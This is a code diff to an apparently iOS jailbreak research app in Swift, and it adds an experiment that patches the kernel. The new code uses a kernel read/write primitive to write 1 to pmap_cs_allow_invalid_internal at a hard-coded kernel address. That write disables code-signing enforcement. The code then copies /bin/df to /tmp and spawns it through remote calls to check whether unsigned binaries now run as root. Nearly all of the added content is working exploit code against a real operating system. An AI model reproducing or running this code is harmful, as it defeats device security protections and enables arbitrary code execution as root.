@@ -361,14 +361,21 @@ struct AMFIExperimentView: View {
             
             // ============================================
             // Experiment 39: Kernel fd — DISABLED (causes panic)
-            // fd table is in zone not accessible via socket KRW
             // ============================================
             experimentResults.append(ExperimentResult(
                 name: "kernel fd (DISABLED)",
                 success: false,
-                detail: "⚠️ Disabled — fd table in inaccessible kernel zone.\nReading fd entries via socket KRW causes panic.",
+                detail: "⚠️ Disabled — fd table in inaccessible kernel zone.",
                 timestamp: Date()
             ))
+            
+            // ============================================
+            // 🔥 Experiment 40: PATCH pmap_cs_allow_invalid_internal!
+            // THE BREAKTHROUGH — variable in __DATA, writable via KRW!
+            // Write 1 → disable code signing → run ANY binary!
+            // ============================================
+            let exp40 = self.expPatchCSEnforcement(rc: rc)
+            experimentResults.append(exp40)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -2256,6 +2263,120 @@ struct AMFIExperimentView: View {
     }
     
     // MARK: - Output Capture Research (processes spawn but output empty)
+    
+    /// 🔥 THE BREAKTHROUGH: Patch pmap_cs_allow_invalid_internal
+    /// This variable is in __DATA (WRITABLE!) at unslid VA 0xfffffff00a0e45b8
+    /// Setting it to 1 disables code signing enforcement!
+    private func expPatchCSEnforcement(rc: RemoteCall) -> ExperimentResult {
+        let mgr = dspmgr.shared
+        
+        // Unslid kernel VA of pmap_cs_allow_invalid_internal
+        let unslidVA: UInt64 = 0xfffffff00a0e45b8
+        
+        // Calculate runtime address: unslid + slide
+        let slide = mgr.kernslide
+        let runtimeAddr = unslidVA + slide
+        
+        var detail = """
+        🔥 pmap_cs_allow_invalid_internal
+        Unslid VA:    0x\(String(format: "%llx", unslidVA))
+        Kernel slide: 0x\(String(format: "%llx", slide))
+        Runtime addr: 0x\(String(format: "%llx", runtimeAddr))
+        
+        """
+        
+        // Step 1: Read current value
+        let currentVal = ds_kread32(runtimeAddr)
+        detail += "Step 1 — Read current: 0x\(String(format: "%x", currentVal))\n"
+        
+        if currentVal == 1 {
+            detail += "Already set to 1! CS enforcement already disabled!\n"
+            return ExperimentResult(name: "🔥 PATCH CS ENFORCEMENT", success: true, detail: detail, timestamp: Date())
+        }
+        
+        // Step 2: Write 1 to disable code signing
+        detail += "Step 2 — Writing 1 to disable CS enforcement...\n"
+        ds_kwrite32(runtimeAddr, 1)
+        
+        // Step 3: Read back to verify
+        let afterVal = ds_kread32(runtimeAddr)
+        detail += "Step 3 — Read back: 0x\(String(format: "%x", afterVal))\n\n"
+        
+        if afterVal == 1 {
+            detail += "✅✅✅ WRITE SUCCEEDED! CS ENFORCEMENT DISABLED! ✅✅✅\n\n"
+            detail += "Code signing is now DISABLED in kernel!\n"
+            detail += "Testing: spawn copied binary...\n\n"
+            
+            // Step 4: TEST — copy /bin/df to /tmp and spawn it!
+            let mem = rc.trojanMem
+            let srcPath = remote_alloc_str(rc, "/bin/df")
+            let dstPath = remote_alloc_str(rc, "/tmp/.dsp_unsigned_test")
+            
+            // Copy binary
+            let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+            let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+            
+            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+                let bufAddr = mem + 0x800
+                var copied: UInt64 = 0
+                for _ in 0..<100 {
+                    let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
+                    if n == 0 || n > 2048 { break }
+                    RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
+                    copied += n
+                }
+                RootExecutor.rcall(rc, "close", srcFd)
+                RootExecutor.rcall(rc, "close", dstFd)
+                
+                detail += "Copied /bin/df to /tmp (\(copied) bytes)\n"
+                
+                // Try to spawn the COPY (previously failed with ret=1!)
+                let argvBase = mem + 0x1C00
+                rc[argvBase].setValue64(dstPath)
+                rc[argvBase + 8].setValue64(0)
+                let pidAddr = mem + 0x1A00
+                rc[pidAddr].setValue64(0)
+                
+                let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
+                let spawnPid = rc[pidAddr].value32()
+                
+                detail += "posix_spawn(/tmp/copy): ret=\(spawnRet), pid=\(spawnPid)\n"
+                
+                // Wait and reap
+                RootExecutor.rcall(rc, "usleep", 1000000)
+                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+                detail += "waitpid: \(waitRet)\n\n"
+                
+                if spawnRet == 0 {
+                    detail += "🎉🎉🎉 COPIED BINARY SPAWNED!!! 🎉🎉🎉\n"
+                    detail += "CODE SIGNING BYPASS ACHIEVED!\n"
+                    detail += "CAN NOW RUN ANY BINARY AS ROOT!\n"
+                    detail += "FULL JAILBREAK UNLOCKED!\n"
+                } else if spawnRet == 1 {
+                    detail += "❌ Still ret=1 (AMFI still blocking)\n"
+                    detail += "pmap_cs_allow_invalid might not be enough alone\n"
+                    detail += "May need to also patch cs_enforcement_disable\n"
+                } else {
+                    detail += "ret=\(spawnRet) — different error than before!\n"
+                }
+                
+                // Cleanup
+                RootExecutor.rcall(rc, "unlink", dstPath)
+            }
+            
+            RootExecutor.rcall(rc, "free", srcPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            
+            return ExperimentResult(name: "🔥 PATCH CS ENFORCEMENT", success: afterVal == 1, detail: detail, timestamp: Date())
+            
+        } else {
+            detail += "❌ Write FAILED — value still 0x\(String(format: "%x", afterVal))\n"
+            detail += "PPL may protect this address despite being in __DATA\n"
+            detail += "Or: address calculation wrong (check kernel_slide)\n"
+            
+            return ExperimentResult(name: "🔥 PATCH CS ENFORCEMENT", success: false, detail: detail, timestamp: Date())
+        }
+    }
     
     /// Spawn from SpringBoard context instead of launchd
     /// SpringBoard is uid=501 but NOT PID 1 — might handle pointers differently
